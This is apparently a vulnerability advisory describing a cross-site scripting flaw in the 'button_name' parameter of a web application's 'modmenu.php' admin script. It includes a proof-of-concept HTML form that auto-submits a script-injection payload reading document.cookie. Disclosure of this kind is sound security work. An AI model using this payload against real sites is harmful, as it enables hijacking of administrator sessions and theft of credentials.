Vulnerability Details:
User can execute arbitrary JavaScript code within the vulnerable application.

The vulnerability exists due to failure in the "modmenu.php" script to properly sanitize user-supplied input in "button_name" variable. Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.

An attacker can use browser to exploit this vulnerability. The following PoC is available:

<form action="http://host/admin/plugin.php?menu_id=1&module=menu&plitem=modmenu.php" method="post" name="main" >
<input type="hidden" name="module" value="menu" />
<input type="hidden" name="plitem" value="modmenu.php" />
<input type="hidden" name="menu_id" value="1" />
<input type="hidden" name="button_name" value='bn"><script>alert(document.cookie)</script>' />
<input type="hidden" name="new_make" value="YES" />
</form>
<script>
document.main.submit();
</script>
